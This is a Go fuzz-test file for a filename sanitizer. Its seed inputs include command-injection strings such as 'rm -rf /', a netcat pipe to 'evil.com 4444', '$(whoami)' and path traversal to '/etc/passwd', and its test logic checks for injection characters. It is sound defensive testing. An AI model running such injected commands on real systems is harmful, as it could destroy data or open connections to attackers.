package clean

import (
	"path/filepath"
	"strings"
	"testing"
)

// FuzzSanitizeNameSecurity tests SanitizeName for security vulnerabilities
func FuzzSanitizeNameSecurity(f *testing.F) {
	// Seed with various security-focused inputs
	f.Add("normal-file.txt")
	f.Add("")
	f.Add("CON")
	f.Add("PRN.txt")
	f.Add("../../../etc/passwd")
	f.Add("file<script>alert('xss')</script>.html")
	f.Add("file;rm -rf /.txt")
	f.Add("file|nc evil.com 4444.sh")
	f.Add("file$(whoami).txt")
	f.Add("file`id`.sh")
	f.Add("file\x00null.txt")
	f.Add("file\ninjection.txt")
	f.Add("file\r\nCRLF.txt")
	f.Add(strings.Repeat("A", 10000))
	f.Add("C:\\Windows\\System32\\cmd.exe")
	f.Add("\\\\server\\share\\file.txt")
	f.Add("file:with:colons.txt")
	f.Add("file*with*wildcards.txt")
	f.Add("file?with?questions.txt")
	f.Add("COM1.exe")
	f.Add("LPT9.printer")
	f.Add("AUX....")
	f.Add("   spaces   .txt   ")
	f.Add(".....dots.....")
	f.Add("☠️💀🦠.txt")
	f.Add("\u202e\u0000evil.txt")

	f.Fuzz(func(t *testing.T, name string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("SanitizeName panicked with input=%q: %v", name, r)
			}
		}()

		// Sanitize the name
		sanitized := SanitizeName(name)

		// Security validation
		// Check that forbidden characters are removed
		forbiddenChars := []string{"<", ">", ":", "\"", "/", "\\", "|", "?", "*"}
		for _, char := range forbiddenChars {
			if strings.Contains(sanitized, char) {
				t.Errorf("Forbidden character %q not removed from sanitized name: %q", char, sanitized)
			}
		}

		// Check for path traversal attempts
		if strings.Contains(name, "..") && strings.Contains(sanitized, "..") {
			t.Logf("Path traversal pattern survived sanitization: %q -> %q", name, sanitized)
		}

		// Check for null bytes
		if strings.Contains(sanitized, "\x00") {
			t.Errorf("Null byte survived sanitization: %q", sanitized)
		}

		// Check for newlines and carriage returns
		if strings.ContainsAny(sanitized, "\n\r") {
			t.Errorf("Newline/CR survived sanitization: %q", sanitized)
		}

		// Check that result is never empty
		if sanitized == "" {
			t.Errorf("Sanitized name is empty for input: %q", name)
		}

		// Check reserved device names
		upperSanitized := strings.ToUpper(sanitized)
		baseWithoutExt := strings.Split(upperSanitized, ".")[0]

		// Check if it's a reserved name without the _file suffix
		if reserved[baseWithoutExt] && !strings.HasSuffix(sanitized, "_file") {
			// If the whole sanitized name is reserved, it should have _file appended
			if reserved[strings.ToUpper(sanitized)] {
				t.Errorf("Reserved device name not properly handled: %q -> %q", name, sanitized)
			}
		}

		// Check no trailing spaces or dots
		if strings.HasSuffix(sanitized, " ") || strings.HasSuffix(sanitized, ".") {
			t.Errorf("Trailing spaces or dots not removed: %q", sanitized)
		}

		// Check for command injection patterns that should be neutralized
		injectionPatterns := []string{";", "&", "|", "`", "$", "(", ")"}
		for _, pattern := range injectionPatterns {
			if strings.Contains(name, pattern) && strings.Contains(sanitized, pattern) {
				t.Logf("Command injection pattern may have survived: %q in %q", pattern, sanitized)
			}
		}

		// Check for extremely long names (DoS)
		if len(sanitized) > 255 {
			t.Logf("Sanitized name exceeds typical filesystem limit: %d chars", len(sanitized))
		}

		// Verify idempotency - sanitizing twice should give same result
		doubleSanitized := SanitizeName(sanitized)
		if doubleSanitized != sanitized {
			t.Errorf("Sanitization is not idempotent: %q -> %q -> %q", name, sanitized, doubleSanitized)
		}
	})
}

// FuzzWalkAndSanitizeSecurity tests path handling in WalkAndSanitize
func FuzzWalkAndSanitizeSecurity(f *testing.F) {
	// Seed with various path scenarios
	f.Add("/tmp/test")
	f.Add("")
	f.Add("../../../etc")
	f.Add("/tmp/test;rm -rf /")
	f.Add("/tmp/test\x00/etc")
	f.Add("C:\\Windows\\System32")
	f.Add("\\\\server\\share")
	f.Add("/tmp/$(whoami)")
	f.Add("/tmp/test\n/etc/passwd")
	f.Add(strings.Repeat("/deep", 100))

	f.Fuzz(func(t *testing.T, root string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("WalkAndSanitize panicked with root=%q: %v", root, r)
			}
		}()

		// Security checks on the root path
		// Check for path traversal
		if strings.Contains(root, "..") {
			t.Logf("Path traversal in root: %q", root)
		}

		// Check for null bytes
		if strings.Contains(root, "\x00") {
			t.Logf("Null byte in root path: %q", root)
		}

		// Check for command injection
		if strings.ContainsAny(root, ";|&`$()") {
			t.Logf("Command injection characters in root: %q", root)
		}

		// Check for newlines (log injection)
		if strings.ContainsAny(root, "\n\r") {
			t.Logf("Newline characters in root: %q", root)
		}

		// Don't actually walk the filesystem in tests
		// Just validate the path handling

		// Check if path is absolute or relative
		if root != "" && !filepath.IsAbs(root) && !strings.HasPrefix(root, ".") {
			t.Logf("Ambiguous relative path: %q", root)
		}

		// Check for Windows UNC paths on non-Windows systems
		if strings.HasPrefix(root, "\\\\") {
			t.Logf("Windows UNC path: %q", root)
		}

		// Check for extremely deep paths (DoS)
		if strings.Count(root, string(filepath.Separator)) > 50 {
			t.Logf("Extremely deep path: %q", root)
		}
	})
}

// FuzzRenameIfNeededSecurity tests rename operation security
func FuzzRenameIfNeededSecurity(f *testing.F) {
	// Seed with various file paths
	f.Add("/tmp/normal.txt")
	f.Add("/tmp/CON.txt")
	f.Add("")
	f.Add("/tmp/../etc/passwd")
	f.Add("/tmp/file<script>.html")
	f.Add("/tmp/file;touch /tmp/pwned")
	f.Add("/tmp/file\x00.txt")
	f.Add("relative/path/file.txt")
	f.Add("/tmp/" + strings.Repeat("long", 100) + ".txt")

	f.Fuzz(func(t *testing.T, oldPath string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("RenameIfNeeded panicked with oldPath=%q: %v", oldPath, r)
			}
		}()

		// Extract components
		dir := filepath.Dir(oldPath)
		oldName := filepath.Base(oldPath)
		newName := SanitizeName(oldName)

		// Security validation
		// Check that directory traversal doesn't affect the directory
		if strings.Contains(dir, "..") {
			t.Logf("Directory contains traversal: %q", dir)
		}

		// Verify the new path would be safe
		newPath := filepath.Join(dir, newName)

		// Check that we're not escaping the original directory
		cleanDir := filepath.Clean(dir)
		cleanNewDir := filepath.Clean(filepath.Dir(newPath))
		if cleanDir != cleanNewDir {
			t.Errorf("Rename would change directory: %q -> %q", cleanDir, cleanNewDir)
		}

		// Check for null bytes in paths
		if strings.Contains(newPath, "\x00") {
			t.Errorf("Null byte in new path: %q", newPath)
		}

		// Verify sanitization was applied
		if newName != oldName {
			// Check that problematic characters were handled
			for _, char := range []string{"<", ">", ":", "\"", "/", "\\", "|", "?", "*"} {
				if strings.Contains(oldName, char) && strings.Contains(newName, char) {
					t.Errorf("Forbidden character %q not sanitized", char)
				}
			}
		}

		// Check for symlink attacks
		if strings.Contains(oldPath, "->") {
			t.Logf("Potential symlink in path: %q", oldPath)
		}

		// Check absolute vs relative paths
		if oldPath != "" {
			isAbs := filepath.IsAbs(oldPath)
			newIsAbs := filepath.IsAbs(newPath)
			if isAbs != newIsAbs {
				t.Errorf("Path absoluteness changed: %v -> %v", isAbs, newIsAbs)
			}
		}
	})
}

// FuzzReservedNamesSecurity specifically tests handling of reserved names
func FuzzReservedNamesSecurity(f *testing.F) {
	// Seed with variations of reserved names
	f.Add("CON")
	f.Add("con")
	f.Add("Con")
	f.Add("CON.txt")
	f.Add("CON.exe")
	f.Add("PRN.printer")
	f.Add("AUX.device")
	f.Add("NUL")
	f.Add("COM1")
	f.Add("COM9")
	f.Add("LPT1")
	f.Add("LPT9")
	f.Add("CON.CON")
	f.Add("PRN.PRN.PRN")
	f.Add("CON ")
	f.Add(" CON")
	f.Add("CON.")
	f.Add(".CON")
	f.Add("CONCON")
	f.Add("NotCON")
	f.Add("CONtainer")

	f.Fuzz(func(t *testing.T, name string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("SanitizeName panicked with reserved name variant=%q: %v", name, r)
			}
		}()

		sanitized := SanitizeName(name)

		// Check if the base name (without extension) is reserved
		upperName := strings.ToUpper(strings.TrimSpace(name))
		baseName := strings.Split(upperName, ".")[0]

		if reserved[baseName] {
			// Should have _file appended
			if !strings.Contains(sanitized, "_file") {
				// Check if it's exactly a reserved name (not part of a longer name)
				if reserved[strings.ToUpper(sanitized)] {
					t.Errorf("Reserved name not handled: %q -> %q", name, sanitized)
				}
			}
		}

		// Verify the sanitized name won't cause issues on Windows
		// Check it doesn't end with space or dot
		if strings.HasSuffix(sanitized, " ") || strings.HasSuffix(sanitized, ".") {
			t.Errorf("Invalid ending for Windows: %q", sanitized)
		}

		// Verify it's not empty
		if sanitized == "" {
			t.Errorf("Empty result for input: %q", name)
		}
	})
}

// FuzzPathSeparatorsSecurity tests handling of different path separators
func FuzzPathSeparatorsSecurity(f *testing.F) {
	// Seed with various path separator scenarios
	f.Add("normal/file.txt")
	f.Add("windows\\path\\file.txt")
	f.Add("mixed/path\\file.txt")
	f.Add("multiple//slashes///file.txt")
	f.Add("multiple\\\\backslashes\\\\\\file.txt")
	f.Add("/absolute/path/file.txt")
	f.Add("\\absolute\\windows\\path.txt")
	f.Add("file/with:colon.txt")
	f.Add("")
	f.Add("/")
	f.Add("\\")
	f.Add("//")
	f.Add("\\\\")

	f.Fuzz(func(t *testing.T, input string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Path separator handling panicked with input=%q: %v", input, r)
			}
		}()

		// Test both as a full path and as a filename
		sanitized := SanitizeName(input)

		// Forward slashes should be replaced
		if strings.Contains(sanitized, "/") {
			t.Errorf("Forward slash not replaced in: %q -> %q", input, sanitized)
		}

		// Backslashes should be replaced
		if strings.Contains(sanitized, "\\") {
			t.Errorf("Backslash not replaced in: %q -> %q", input, sanitized)
		}

		// Result should not be empty
		if sanitized == "" && input != "" {
			t.Errorf("Non-empty input resulted in empty output: %q", input)
		}

		// Check for any remaining path separators
		if strings.ContainsAny(sanitized, "/\\") {
			t.Errorf("Path separators remain in sanitized name: %q", sanitized)
		}
	})
}

// FuzzUnicodeSecurity tests handling of Unicode and special characters
func FuzzUnicodeSecurity(f *testing.F) {
	// Seed with Unicode edge cases
	f.Add("normal.txt")
	f.Add("файл.txt")
	f.Add("文件.txt")
	f.Add("🗂️.txt")
	f.Add("\u202e\u202dfile.txt") // Right-to-left override
	f.Add("\u0000null.txt")
	f.Add("\ufeffBOM.txt")
	f.Add(string([]byte{0xff, 0xfe}) + "invalid.txt")
	f.Add("\u200b\u200c\u200dzero-width.txt")
	f.Add("file\u0301\u0302\u0303.txt") // Combining characters

	f.Fuzz(func(t *testing.T, name string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Unicode handling panicked with input=%q: %v", name, r)
			}
		}()

		sanitized := SanitizeName(name)

		// Check for null bytes
		if strings.Contains(sanitized, "\x00") {
			t.Errorf("Null byte in sanitized name: %q", sanitized)
		}

		// Check for direction override characters
		dangerousUnicode := []rune{
			'\u202a', '\u202b', '\u202c', '\u202d', '\u202e', // Directional
			'\u200b', '\u200c', '\u200d', // Zero-width
			'\ufeff', // BOM
		}

		for _, r := range dangerousUnicode {
			if strings.ContainsRune(name, r) {
				t.Logf("Dangerous Unicode character U+%04X in input", r)
			}
		}

		// Ensure result is valid
		if sanitized == "" {
			t.Errorf("Empty result for Unicode input: %q", name)
		}

		// Check that forbidden ASCII characters are still removed
		forbiddenChars := []string{"<", ">", ":", "\"", "/", "\\", "|", "?", "*"}
		for _, char := range forbiddenChars {
			if strings.Contains(sanitized, char) {
				t.Errorf("Forbidden character %q not removed from Unicode string", char)
			}
		}
	})
}
